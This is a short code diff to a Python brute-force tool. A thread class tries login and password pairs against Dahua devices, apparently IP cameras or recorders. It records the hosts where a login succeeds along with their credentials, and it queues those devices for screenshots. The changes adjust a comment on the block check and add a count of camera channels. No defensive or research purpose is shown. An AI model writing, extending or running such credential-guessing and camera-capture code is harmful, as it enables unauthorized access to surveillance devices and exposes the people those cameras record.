@@ -4,8 +4,6 @@ import config
 
 from dahua import *
 
-#from wrapt_timeout_decorator import *
-
 
 class BruteThread(threading.Thread):
     def __init__(self, brute_queue, screenshot_queue):
@@ -49,10 +47,11 @@ class BruteThread(threading.Thread):
                 try:
                     res = self.dahua_login(server_ip, port, login, password)
 #                    anti_block += 1
-                    if res == "Blocked": #or anti_block > 4:
+                    if res == "Blocked": #and anti_block > 4:
                         break
                     elif res:
                         config.working_hosts.append([res.ip, res.port, res.login, res.password, res])
+                        config.ch_count += res.channels_count
                         self.screenshot_queue.put(res)
                         return
                 except Exception as e:
@@ -66,6 +65,7 @@ class BruteThread(threading.Thread):
                             break
                         elif res:
                             config.working_hosts.append([res.ip, res.port, res.login, res.password, res])
+                            config.ch_count += res.channels_count
                             self.screenshot_queue.put(res)
                             return
                     except Exception as e:
